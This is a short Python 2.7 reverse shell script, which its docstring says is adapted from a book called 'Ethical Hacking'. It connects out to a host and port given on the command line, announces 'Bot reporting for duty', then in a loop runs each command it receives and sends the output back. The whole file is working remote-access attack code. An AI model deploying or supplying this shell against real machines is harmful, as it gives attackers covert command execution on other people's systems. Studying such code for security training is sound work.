#!/usr/bin/env python
# Scripted to run on python 2.7

"""
Description: Reverse Shell script as laid out in the book "Ethical Hacking". Made some adjustments of my own as well.
"""

import sys
from subprocess import Popen, PIPE
from socket import *

# Guard clause
if len(sys.argv) < 2 :
    print "Missing one argument.\nUsage: {} <hacker_host> <port - optional>\nExiting.".format(sys.argv[0])
    exit()

serverName = sys.argv[1]
serverPort = sys.argv[2] if len(sys.argv) > 2 else 8000

print "SERVER: {} PORT: {}".format(serverName,serverPort)

# Create IPv4 (AF_INET) TCPSocket (SOCK_STREAM) on this client machine
clientSocket = socket(AF_INET, SOCK_STREAM)

# Create IPv6 (AF_INET) UDPSocket (SOCK_DGRAM)
# clientSocket = socket(AF_INET6, SOCK_DGRAM)

clientSocket.connect((serverName,serverPort))
clientSocket.send('Bot reporting for duty'.encode())

command = clientSocket.recv(4064).decode()

while command != 'exit':

    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    clientSocket.send(result)
    command = (clientSocket.recv(4064)).decode()

clientSocket.close()